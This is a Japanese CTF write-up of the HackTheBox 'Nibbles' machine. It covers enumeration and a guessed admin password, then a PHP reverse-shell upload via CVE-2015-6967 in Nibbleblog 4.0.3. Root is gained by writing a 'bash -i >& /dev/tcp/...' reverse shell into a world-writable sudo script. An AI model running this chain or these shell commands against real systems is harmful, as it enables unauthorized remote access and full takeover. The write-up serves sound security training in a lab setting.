+++
title = "HackTheBox - Nibbles Writeup"
date = "2026-04-11"
description = "Nibbleblog の認証済みファイルアップロード脆弱性と sudo 設定ミスを悪用した Easy Linux マシン"
tags = ["HackTheBox", "CTF", "Linux", "CVE-2015-6967", "Nibbleblog", "FileUpload", "sudo", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field      | Details                        |
|------------|--------------------------------|
| Machine    | Nibbles                        |
| OS         | Linux (Ubuntu)                 |
| Difficulty | Easy                           |
| IP         | 10.129.16.225                  |
| CVE        | CVE-2015-6967                  |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.16.225
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- ポート 22: OpenSSH 7.2p2
- ポート 80: Apache 2.4.18

---

## Web Enumeration

### ページソースの確認

ブラウザで `http://10.129.16.225/` にアクセスすると「Hello World!」のみ表示される。  
ページソースを確認すると、HTML コメントに隠しディレクトリへの参照が見つかる。

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

### Gobuster によるディレクトリ列挙

```bash
gobuster dir -u http://10.129.16.225:80/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt
```

```text
admin       (Status: 301) --> http://10.129.16.225/nibbleblog/admin/
admin.php   (Status: 200)
content     (Status: 301) --> http://10.129.16.225/nibbleblog/content/
index.php   (Status: 200)
languages   (Status: 301)
plugins     (Status: 301)
README      (Status: 200)
themes      (Status: 301)
```

### 重要ファイルの確認

**README** からバージョンを確認:
- Nibbleblog **v4.0.3** が動作していることを確認

**users.xml** からユーザー名を確認:

```
http://10.129.16.225/nibbleblog/content/private/users.xml
```

- ユーザー名: `admin` を確認
- ブラックリスト機能が存在するため、ブルートフォースは不可

**config.xml** からパスワードのヒントを確認:

```
http://10.129.16.225/nibbleblog/content/private/config.xml
```

- サイトタイトルおよびメールアドレスに `nibbles` という文字列が含まれている
- マシン名と一致 → パスワード候補: `nibbles`

---

## Initial Access

### 管理画面へのログイン

```text
URL:  http://10.129.16.225/nibbleblog/admin.php
User: admin
Pass: nibbles
```


### PHP リバースシェルのアップロード（CVE-2015-6967）

Nibbleblog 4.0.3 は認証済みユーザーが任意の PHP ファイルをアップロードできる脆弱性を持つ。

**手順:**

1. 管理画面 → Plugins → **My Image** → Configure
2. 以下の内容で `php` を作成してアップロード

```php
reverseshell.php
https://github.com/l4ughingc4t/offsec-cheats/blob/main/reverseshell.php
```

アップロード後のファイルパス:

```
http://10.129.16.225/nibbleblog/content/private/plugins/my_image/image.php
```

---

## Listener

```bash
nc -lvnp 4444
```

ブラウザまたは curl でリバースシェルを発火:

```
http://10.129.16.225/nibbleblog/content/private/plugins/my_image/image.php
```

```text
listening on [any] 4444 ...
connect to [10.10.16.166] from (UNKNOWN) [10.129.16.225] 54822
[*] Connected to PHP reverse shell
/bin/sh: 0: can't access tty; job control turned off
$
```

---

## Foothold

```bash
$ whoami
nibbler
```

---

## Post Exploitation

### ユーザーフラグの取得

```bash
$ cat /home/nibbler/user.txt
```

### sudo 権限の確認

```bash
$ sudo -l
```

```text
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

`monitor.sh` をパスワードなしで root として実行できる。

---

## Privilege Escalation

`monitor.sh` は world-writable（誰でも書き込み可能）なため、中身を悪意あるコマンドに書き換えて `sudo` で実行する。

```bash
# ディレクトリ作成
mkdir -p /home/nibbler/personal/stuff

# リバースシェルを monitor.sh に書き込む
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo 'bash -i >& /dev/tcp/10.10.16.166/5555 0>&1' >> /home/nibbler/personal/stuff/monitor.sh

# 実行権限を付与
chmod +x /home/nibbler/personal/stuff/monitor.sh

# sudo で実行
sudo /home/nibbler/personal/stuff/monitor.sh
```

別ターミナルでリスナーを起動:

```bash
nc -lvnp 5555
```

---

## Root Shell

```text
listening on [any] 5555 ...
connect to [10.10.16.166] from (UNKNOWN) [10.129.16.225] 49570
bash: cannot set terminal process group (1367): Inappropriate ioctl for device
bash: no job control in this shell
root@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image#
```

```bash
# whoami
root
```

---

## Flags

### User

```bash
cat /home/nibbler/user.txt
```

### Root

```bash
cat /root/root.txt
```

---

## Summary

```
Web列挙（ページソース → /nibbleblog/ 発見）
  ↓
users.xml でユーザー名 admin 確認
  ↓
config.xml からパスワード nibbles を推測 → 管理画面ログイン
  ↓
CVE-2015-6967: My Image プラグインで PHP シェルをアップロード → nibbler として RCE
  ↓
sudo -l で monitor.sh を NOPASSWD: root で実行可能と判明
  ↓
world-writable な monitor.sh にリバースシェルを書き込み sudo 実行 → root 奪取
```
